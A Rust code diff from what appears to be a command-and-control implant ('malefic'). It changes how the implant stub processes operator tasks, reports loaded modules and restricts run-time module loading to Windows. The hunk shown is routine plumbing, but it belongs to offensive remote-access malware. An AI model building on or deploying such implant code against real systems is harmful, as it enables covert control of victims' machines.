@@ -12,7 +12,7 @@ use malefic_core::common::error::MaleficError;
 use malefic_core::manager::internal::InternalModule;
 use malefic_core::manager::manager::MaleficManager;
 use malefic_core::scheduler::TaskOperator;
-use malefic_core::transport::{Client, Transport};
+use malefic_core::transport::{Client, InnterTransport};
 use malefic_core::{check_body, config};
 use malefic_helper::debug;
 use malefic_proto::proto::{modulepb, implantpb, implantpb::{Spite, Spites}, implantpb::spite::Body};
@@ -74,7 +74,7 @@ impl MaleficStub {
 
     pub async fn process_data(
         &mut self,
-        transport: Transport,
+        transport: InnterTransport,
         client: &mut Client,
     ) -> Result<(), anyhow::Error> {
         self.channel.request_sender.send(true).await?;
@@ -84,9 +84,17 @@ impl MaleficStub {
         } else {
             EMPTY_SPITES.clone()
         };
-        debug!("spites: {:#?}", spites);
+
+        #[cfg(debug_assertions)]
+        {
+            if malefic_proto::get_message_len(&spites) <= 2048 {
+                println!("{:#?}", spites);
+            } else {
+                println!("length: {}", spites.spites.len());
+            }
+        }
         let marshaled = marshal(self.meta.get_uuid(), spites.clone())?;
-        if let Ok(res) = client.handler(transport.clone(), marshaled).await {
+        if let Ok(res) = client.handler(transport, marshaled).await {
             match res {
                 Some(spite_data) => {
                     let spites = spite_data.parse()?;
@@ -162,7 +170,9 @@ impl MaleficStub {
                 self.push(new_spite(
                     req.task_id,
                     InternalModule::RefreshModule.to_string(),
-                    Body::Empty(implantpb::Empty::default()),
+                    Body::Modules(modulepb::Modules {
+                        modules: self.manager.list_module(InternalModule::all()),
+                    }),
                 ))
                 .await?;
             }
@@ -176,14 +186,21 @@ impl MaleficStub {
                 );
                 self.push(result).await?;
             }
+            #[cfg(target_os = "windows")]
             Ok(InternalModule::LoadModule) => {
-                self.manager.load_module(req.clone())?;
+                let modules = self.manager.load_module(req.clone())?;
                 self.push(new_spite(
                     req.task_id,
                     InternalModule::LoadModule.to_string(),
-                    Body::Empty(implantpb::Empty::default()),
+                    Body::Modules(modulepb::Modules {
+                        modules,
+                    }),
                 ))
                 .await?;
+            }
+            #[cfg(not(target_os = "windows"))]
+            Ok(InternalModule::LoadModule) => {
+                return Err(anyhow::anyhow!("LoadModule is only supported on Windows"));
             }
             Ok(InternalModule::LoadAddon) => {
                 self.manager.load_addon(req.clone())?;
